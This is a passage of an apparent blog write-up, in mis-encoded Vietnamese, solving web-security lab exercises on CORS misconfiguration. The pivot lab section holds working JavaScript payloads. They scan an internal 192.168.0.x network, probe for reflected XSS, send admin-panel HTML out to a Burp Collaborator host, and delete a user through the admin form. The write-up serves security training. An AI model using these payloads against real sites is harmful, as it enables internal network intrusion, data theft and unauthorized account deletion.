</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_protocol_exploitserver.png?raw=true" alt="image"></p>
<p>Sau Ä‘Ã³ Store payload Deliver to Victim Ä‘á»ƒ gá»­i payload sang trang web mÃ  mÃ¬nh exploit</p>
<p>Access log Ä‘á»ƒ hiá»‡n nhá»¯ng data mÃ  mÃ¬nh leak Ä‘Æ°á»£c thÃ´ng qua tÃªn miá»n phá»¥ nhÆ° sau :</p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_protocal_accesslog.png?raw=true" alt="image"></p>
<p>Truy cáº­p decoder cá»§a Burp Ä‘á»ƒ decoder url vÃ  láº¥y apikey Ä‘á»ƒ submit</p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_protocol_decoder.png?raw=true" alt="image"></p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_protocal_submit.png?raw=true" alt="image"></p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_protocal_solve.png?raw=true" alt="image"></p>
<h3 id="lab-cors-vulnerability-with-internal-network-pivot-attack">Lab: CORS vulnerability with internal network pivot attack</h3>
<p>Trang web nÃ y cÃ³ cáº¥u hÃ¬nh CORS khÃ´ng an toÃ n á»Ÿ chá»— nÃ³ tin cáº­y táº¥t cáº£ cÃ¡c nguá»“n gá»‘c cá»§a máº¡ng ná»™i bá»™.</p>
<p>Lab nÃ y yÃªu cáº§u nhiá»u bÆ°á»›c Ä‘á»ƒ hoÃ n thÃ nh. Äá»ƒ giáº£i quyáº¿tlab, hÃ£y táº¡o má»™t sá»‘ JavaScript Ä‘á»ƒ Ä‘á»‹nh vá»‹ Ä‘iá»ƒm cuá»‘i trÃªn máº¡ng cá»¥c bá»™ (192.168.0.0/24, cá»•ng 8080) mÃ  sau Ä‘Ã³ báº¡n cÃ³ thá»ƒ sá»­ dá»¥ng Ä‘á»ƒ xÃ¡c Ä‘á»‹nh vÃ  táº¡o má»™t cuá»™c táº¥n cÃ´ng dá»±a trÃªn CORS Ä‘á»ƒ xÃ³a ngÆ°á»i dÃ¹ng. Lab Ä‘Æ°á»£c giáº£i quyáº¿t khi báº¡n xÃ³a ngÆ°á»i dÃ¹ng Carlos.</p>
<p>TrÆ°á»ng há»£p mÃ  bÃ i lab nÃ y Ä‘Æ°a ra Ä‘Ã³ chÃ­nh lÃ  chÃºng ta pháº£i tÃ¬m Ä‘Æ°á»£c vá»‹ trÃ­ cá»§a 1 private IP mÃ  website nÃ y tin tÆ°á»Ÿng vÃ  dá»±a vÃ o Ä‘Ã³ Ä‘á»ƒ táº¥n cÃ´ng vÃ  xÃ³a Ä‘i ngÆ°á»i dÃ¹ng,</p>
<p>ÄÃ¢y lÃ  1 bÃ i cáº¥p Ä‘á»™ Expert cÃ³ nghÄ©a lÃ  1 bÃ i cá»±c ká»³ phá»©c táº¡p vÃ  level cao. Tuy nhiÃªn chÃºng ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c cÃ¡ch thá»©c khai thÃ¡c lÃ  gÃ¬ nÃªn bÃ¢y giá» sáº½ follow theo hÆ°á»›ng dáº«n vÃ  exploit nÃ³ thÃ´i.</p>
<h5 id="bÆ°á»›c-Ä‘áº§u-tiÃªn-quÃ©t-máº¡ng-ná»™i-bá»™">BÆ°á»›c Ä‘áº§u tiÃªn: quÃ©t máº¡ng ná»™i bá»™</h5>
<p>Äáº§u tiÃªn viá»‡c chÃºng ta cáº§n lÃ m lÃ  quÃ©t máº¡ng ná»™i bá»™ Ä‘á»ƒ tÃ¬m ra Ä‘Æ°á»£c Ä‘á»‹a chá»‰ IP, Ä‘á»ƒ tÃ¬m Ä‘Æ°á»£c thÃ¬ chÃºng ta cáº§n sá»± há»— trá»£ cá»§a Burp Suite Collaborator Client Ä‘á»ƒ poll nhá»¯ng response leak Ä‘Æ°á»£c vá», Ä‘oáº¡n payload dÆ°á»›i Ä‘Ã¢y sáº½ quÃ©t tá»« http://192.168.0.1 - http://192.168.0.255 vÃ  tÃ¬m xem Ä‘á»‹a chá»‰ nÃ o phÃ¹ há»£p</p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_pivot_findIP_exploit.png?raw=true" alt="image"></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;script&gt;
var q = [], collaboratorURL = &#39;http://bbq6iwl2yh0xqnyyqkm0r8w9g0mqaf.burpcollaborator.net&#39;;
for(i=1;i&lt;=255;i++){
  q.push(
  function(url){
    return function(wait){
    fetchUrl(url,wait);
    }
  }(&#39;http://192.168.0.&#39;+i+&#39;:8080&#39;));
}
for(i=1;i&lt;=20;i++){
  if(q.length)q.shift()(i*100);
}
function fetchUrl(url, wait){
  var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=&gt;r.text().then(text=&gt;
    {
    location = collaboratorURL + &#39;?ip=&#39;+url.replace(/^http:\/\//,&#39;&#39;)+&#39;&amp;code=&#39;+encodeURIComponent(text)+&#39;&amp;&#39;+Date.now()
  }
  ))
  .catch(e =&gt; {
  if(q.length) {
    q.shift()(wait);
  }
  });
  setTimeout(x=&gt;{
  controller.abort();
  if(q.length) {
    q.shift()(wait);
  }
  }, wait);
}
&lt;/script&gt;

</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_pivot_findIP_accesslog.png?raw=true" alt="image"></p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_pivot_findIP_pull.png?raw=true" alt="image"></p>
<p>NhÆ° chÃºng ta cÃ³ thá»ƒ tháº¥y, chÃºng ta Ä‘Ã£ Ä‘á»‹nh vá»‹ mÃ¡y chá»§ ná»™i bá»™ (trong trÆ°á»ng há»£p nÃ y) lÃ : <em>192.168.0.212:8080</em></p>
<h5 id="bÆ°á»›c-thá»©-hai-tÃ¬m-lá»—-há»•ng-trong-mÃ¡y-chá»§-ná»™i-bá»™">BÆ°á»›c thá»© hai: tÃ¬m lá»— há»•ng trong mÃ¡y chá»§ ná»™i bá»™</h5>
<p>á» bÆ°á»›c nÃ y chÃºng ta thá»±c hiá»‡n tÆ°Æ¡ng tá»± bÆ°á»›c Ä‘áº§u tiÃªn nhÆ°ng khÃ¡c biá»‡t á»Ÿ pháº§n payload nhÆ° sau :</p>
<p>Äoáº¡n code nÃ y Ä‘ang cá»‘ gá»­i username vÃ  password Ä‘i, náº¿u nhÆ° username vÃ  password Ä‘Æ°á»£c tráº£ vá» trong response thÃ¬ chá»©ng tá» ráº±ng cÃ³ thá»ƒ dáº«n Ä‘áº¿n lá»—i XSS.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;script&gt;
function xss(url, text, vector) {
  location = url + &#39;/login?time=&#39;+Date.now()+&#39;&amp;username=&#39;+encodeURIComponent(vector)+&#39;&amp;password=test&amp;csrf=&#39;+text.match(/csrf&#34; value=&#34;([^&#34;]+)&#34;/)[1];
}

function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=&gt;r.text().then(text=&gt;
  {
    xss(url, text, &#39;&#34;&gt;&lt;img src=&#39;+collaboratorURL+&#39;?foundXSS=1&gt;&#39;);
  }
  ))
}

fetchUrl(&#34;http://192.168.0.212:8080&#34;, &#34;http://bbq6iwl2yh0xqnyyqkm0r8w9g0mqaf.burpcollaborator.net&#34;);
&lt;/script&gt;

</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_pivot_findXSS_payload.png?raw=true" alt="image"></p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_pivot_findXSS_pull.png?raw=true" alt="image"></p>
<p>NhÆ° chÃºng tÃ´i mong Ä‘á»£i tÃªn ngÆ°á»i dÃ¹ng Ä‘Æ°á»£c pháº£n Ã¡nh trong pháº£n há»“i (trong hÃ¬nh).</p>
<p>Äiá»u nÃ y cÃ³ nghÄ©a lÃ  chÃºng ta cÃ³ thá»ƒ chuyá»ƒn hÆ°á»›ng náº¡n nhÃ¢n Ä‘áº¿n trang Ä‘Äƒng nháº­p ná»™i bá»™ vÃ  thá»±c thi cÃ¡c táº­p lá»‡nh tá»« Ä‘Ã³, cÃ³ thá»ƒ bypass qua CORS.</p>
<h5 id="bÆ°á»›c-thá»©-ba--truy-xuáº¥t-admin-panel">BÆ°á»›c thá»© ba : Truy xuáº¥t Admin Panel</h5>
<p>Äoáº¡n code nÃ y sáº½ cho phÃ©p chÃºng ta truy xuáº¥t vÃ o thá»­ panel cá»§a admin</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;script&gt;
function xss(url, text, vector) {
  location = url + &#39;/login?time=&#39;+Date.now()+&#39;&amp;username=&#39;+encodeURIComponent(vector)+&#39;&amp;password=test&amp;csrf=&#39;+text.match(/csrf&#34; value=&#34;([^&#34;]+)&#34;/)[1];
}
function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=&gt;r.text().then(text=&gt;
  {
    xss(url, text, &#39;&#34;&gt;&lt;iframe src=/admin onload=&#34;new Image().src=\&#39;&#39;+collaboratorURL+&#39;?code=\&#39;+encodeURIComponent(this.contentWindow.document.body.innerHTML)&#34;&gt;&#39;);
  }
  ))
}
fetchUrl(&#34;http://192.168.0.212:8080&#34;, &#34;http://bbq6iwl2yh0xqnyyqkm0r8w9g0mqaf.burpcollaborator.net&#34;);
&lt;/script&gt;

</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_pivot_checkresponse_exploitserver.png?raw=true" alt="image"></p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_pivot_checkresponse_poll.png?raw=true" alt="image"></p>
<h5 id="bÆ°á»›c-cuá»‘i">BÆ°á»›c cuá»‘i</h5>
<p>Dá»±a vÃ o biá»ƒu máº«u tráº£ vá» á»Ÿ bÆ°á»›c 3 chÃºng ta tháº¥y chá»©c nÄƒng delete cá»§a admin, vÃ¢y nÃªn chÃºng ta viáº¿t payload nhÆ° sau Ä‘á»ƒ thá»±c thi biá»ƒu máº«u delete vÃ  xÃ³a username = carlos</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;script&gt;
function xss(url, text, vector) {
  location = url + &#39;/login?time=&#39;+Date.now()+&#39;&amp;username=&#39;+encodeURIComponent(vector)+&#39;&amp;password=test&amp;csrf=&#39;+text.match(/csrf&#34; value=&#34;([^&#34;]+)&#34;/)[1];
}

function fetchUrl(url){
  fetch(url).then(r=&gt;r.text().then(text=&gt;
  {
    xss(url, text, &#39;&#34;&gt;&lt;iframe src=/admin onload=&#34;var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\&#39;carlos\&#39;,f.submit()&#34;&gt;&#39;);
  }
  ))
}

fetchUrl(&#34;http://192.168.0.212:8080&#34;);
&lt;/script&gt;

</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_pivot_payload.png?raw=true" alt="image"></p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_pivot_solve.png?raw=true" alt="image"></p>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
